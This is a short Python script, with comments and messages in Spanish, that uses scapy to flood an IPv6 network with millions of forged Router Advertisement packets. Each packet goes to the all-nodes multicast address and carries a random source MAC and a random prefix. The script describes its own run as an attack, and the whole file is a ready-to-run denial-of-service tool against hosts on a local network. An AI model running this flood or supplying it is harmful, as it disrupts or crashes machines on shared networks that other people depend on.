import time
from random import randrange, choice
import sys
import logging
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
	from scapy.all import *
except:
	print("Necesitas tener scapy")
	sys.exit(0)

conf.verb=0

try:

	if sys.argv[1]=='None':
		iface = None
	else:
		iface = sys.argv[1]

	def random_MAC(): # funcion generadora de MACs random
		digito = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
		mac= (choice(digito)+ choice(digito) + ':' + choice(digito)+ choice(digito) + ':' + choice(digito)+ choice(digito) + ':'
		+ choice(digito)+ choice(digito) + ':' + choice(digito)+ choice(digito) + ':' + choice(digito)+ choice(digito))
		return mac

	def random_prefix(): #genedador de prefix random
		digito = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
		prefix= (choice(digito)+ choice(digito) + choice(digito)+ choice(digito) + ':' + choice(digito)+ choice(digito)
		+ choice(digito)+ choice(digito) + '::')
		interfaceID = choice(digito)+ choice(digito) + choice(digito)+ choice(digito)
		return ["2001:dead:"+prefix, "fe80:dead:"+prefix+interfaceID]
	print("Inundacion RA en progreso...")
	for x in range(5000000):
		a = IPv6(dst = 'ff02::1')
		b = ICMPv6ND_RA()
		c = ICMPv6NDOptSrcLLAddr(lladdr=random_MAC())
		d = ICMPv6NDOptMTU()
		e = ICMPv6NDOptPrefixInfo(prefixlen=64, prefix=random_prefix()[0])

		#while True:
		send(a/b/c/d/e, iface=iface)
		os.system("clear")
		print("Inundacion RA en progreso...")
		print("Cantidad de paquetes RA enviados:",x)
		print("precione Ctrl-C para detener el ataque.")

except Exception as e:
	print(e)
	input("enter para salir")